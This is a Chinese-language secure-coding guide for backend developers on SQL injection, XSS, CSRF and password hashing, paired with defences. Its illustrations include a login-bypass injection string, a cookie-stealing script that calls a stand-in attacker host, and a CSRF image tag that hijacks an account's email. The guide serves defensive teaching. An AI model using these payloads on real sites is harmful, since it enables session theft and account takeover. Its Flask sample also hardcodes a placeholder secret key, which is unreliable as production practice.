---
title: Security
layout: collection
permalink: /backend/security/
collection: backend
category: backend
tags:
  - backend
  - security
---

---

你可能覺得“安全是安全專家的事”，但一個小小的安全漏洞就可能導致用戶數據洩露、服務癱瘓、公司聲譽掃地。在現代軟體開發中，安全是每個開發者的責任。一個SQL注入漏洞，就可能讓你的整個數據庫被拖走。

本指南將從開發者的視角出發，介紹最常見的安全威脅以及如何在代碼層面進行有效防禦。

- **目標讀者**: 所有希望編寫更安全代碼的軟體開發者。
- **你將學到**: 如何識別和修復常見的 Web 安全漏洞，並建立“安全第一”的開發思維。

---

## 核心防禦策略

### 1. 永遠不要相信用戶的輸入——輸入驗證與過濾

**威脅**: 攻擊者可以通過輸入惡意數據來執行非預期的操作。最經典的例子就是 **SQL 注入 (SQL Injection)**。

**攻擊場景**:
假設你有一個登錄查詢：
```sql
SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "';
```
如果一個攻擊者在用戶名輸入框中填入 `admin' --`，那麼實際執行的 SQL 將變為：
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...';
```
`--` 在 SQL 中是註釋符，後面的所有內容都被忽略了。攻擊者就這樣繞過了密碼驗證，成功以 `admin` 用戶身份登錄。

**防禦措施：參數化查詢 (Parameterized Queries)**
永遠不要手動拼接 SQL 字符串。使用你所用語言或框架提供的參數化查詢（也稱為預備語句，Prepared Statements）。

```python
# Python (使用 psycopg2 庫) 的正確做法
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password) # 元組中的值會被安全地處理，而不是直接插入查詢字符串
)
```
這樣做，數據庫驅動會將用戶輸入作為純數據處理，而不是作為 SQL 命令的一部分，從根本上杜絕了 SQL 注入的可能。

---

### 2. 別讓攻擊者在你的網站上“貼小廣告”——防禦 XSS

**威脅**: **跨站腳本攻擊 (Cross-Site Scripting, XSS)** 是指攻擊者將惡意腳本注入到你的網頁中，當其他用戶瀏覽這個頁面時，惡意腳本就會在他們的瀏覽器中執行。

**攻擊場景**:
在一個有評論功能的網站上，如果你的後端直接將用戶提交的評論內容顯示在頁面上，攻擊者可以提交這樣的評論：
```html
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
```
當其他用戶查看這條評論時，他們的瀏覽器會執行這段腳本，將他們的 Cookie（可能包含 Session 信息）發送到攻擊者的伺服器。攻擊者就可以利用這個 Cookie 冒充用戶登錄。

**防禦措施：輸出編碼 (Output Encoding)**
在將任何來自用戶的內容顯示到頁面前，對其進行 HTML 編碼。這會將特殊字符（如 `<`、`>`）轉換為它們的 HTML 實體表示（如 `&lt;`、`&gt;`）。

-   **原則**: 瀏覽器會將 `&lt;script&gt;` 作為純文本顯示出來，而不會將其作為標籤來執行。
-   **實戰**: 大多數現代模板引擎（如 Jinja2, EJS, ERB）默認都會進行輸出編碼。你需要確保這個功能是開啟的。

```jinja
{# Jinja2 模板引擎會自動進行編碼 #}
<div>{{ user_comment }}</div>
```
渲染後的 HTML 將是：
```html
<div>&lt;script&gt;fetch(...)&lt;/script&gt;</div>
```
這樣惡意腳本就失效了。

---

### 3. 確認指令是你本人下達的——防禦 CSRF

**威脅**: **跨站請求偽造 (Cross-Site Request Forgery, CSRF)** 是指攻擊者誘騙已登錄的用戶在不知情的情況下，向你的網站發送一個惡意的請求。

**攻擊場景**:
1.  假設你的網站有一個“修改郵箱”的功能，請求的 URL 是 `https://example.com/change_email?new_email=...`。
2.  用戶已經登錄了你的網站。
3.  攻擊者製作了一個惡意網頁，其中包含一張看不見的圖片，其 `src` 指向你的修改郵箱接口：
    ```html
    <img src="https://example.com/change_email?new_email=attacker@evil.com" width="0" height="0">
    ```
4.  攻擊者誘騙用戶訪問這個惡意網頁。
5.  用戶的瀏覽器會自動加載這張“圖片”，因為用戶處於登錄狀態，瀏覽器會自動帶上 `example.com` 的 Cookie。你的伺服器收到請求後，認為是合法操作，於是將用戶的郵箱修改為攻擊者的郵箱。

**防禦措施：CSRF Token**

-   **工作流程**:
    1.  當用戶訪問表單頁面時，伺服器生成一個隨機、唯一的 Token（CSRF Token），並將其嵌入到表單的一個隱藏字段中。同時，伺服器也將這個 Token 存儲在用戶的 Session 中。
    2.  當用戶提交表單時，這個 Token 會隨表單一起發送到伺服器。
    3.  伺服器比較表單提交的 Token 和 Session 中存儲的 Token。如果兩者匹配，則處理請求；如果不匹配，則拒絕請求。

-   **原理**: 攻擊者無法獲取用戶 Session 中的 Token，因此無法偽造合法的請求。

```python
# Flask (使用 Flask-WTF 擴展) 的 CSRF 保護
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'a-secret-key-for-sessions'
csrf = CSRFProtect(app)

# 在模板的表單中，插入 {{ form.csrf_token }}
# Flask-WTF 會自動處理 Token 的生成和驗證
```

---

### 4. 保護你的用戶憑證——安全的密碼存儲

**威脅**: 如果你以明文形式存儲用戶密碼，一旦數據庫洩露，所有用戶的賬戶都將暴露在風險之中。

**錯誤的做法**: 直接存儲密碼，或者使用像 MD5、SHA1 這樣過時的哈希算法。這些算法很容易被“彩虹表”攻擊破解。

**正確的防禦措施：使用現代的、加鹽的哈希算法**

-   **核心概念**:
    -   **哈希 (Hashing)**: 將任意長度的輸入轉換為固定長度的輸出，且該過程不可逆。
    -   **鹽 (Salting)**: 在對密碼進行哈希之前，為每個密碼附加一個隨機生成的、唯一的字符串（鹽）。這樣，即使兩個用戶設置了相同的密碼，由於鹽不同，它們存儲在數據庫中的哈希值也完全不同。

-   **推薦算法**: **Argon2** (目前的競賽冠軍), **scrypt**, 或 **bcrypt**。

```python
# Python (使用 passlib 庫)
from passlib.context import CryptContext

# 推薦使用 Argon2
pwd_context = CryptContext(schemes=["argon2"], deprecated="auto")

# 哈希密碼 (包含了自動生成的鹽)
def hash_password(password):
    return pwd_context.hash(password)

# 驗證密碼
def verify_password(plain_password, hashed_password):
    return pwd_context.verify(plain_password, hashed_password)

# 存儲在數據庫中的將是 hash_password() 返回的長字符串
```

---

## 安全開發的思維檢查清單

-   [ ] **數據庫交互**: 我是否所有 SQL 查詢都使用了參數化？
-   [ ] **前端渲染**: 我是否對所有由用戶提供的、要在頁面上顯示的內容都進行了輸出編碼？
-   [ ] **狀態變更操作**: 我是否對所有會引起狀態變更的請求（特別是 POST, PUT, DELETE）都啟用了 CSRF 保護？
-   [ ] **用戶認證**: 我是否使用了 Argon2 或 bcrypt 等現代算法來存儲密碼哈希？
-   [ ] **依賴管理**: 我是否定期掃描並更新我的項目依賴（如 `npm audit`, `pip-audit`），以修復已知的安全漏洞？
-   [ ] **權限控制**: 我的 API 是否嚴格檢查了用戶是否有權限執行請求的操作（授權）？
-   [ ] **日誌記錄**: 我是否記錄了足夠的信息以便在安全事件發生後進行追溯？但同時，我是否避免在日誌中記錄密碼、Token 等敏感信息？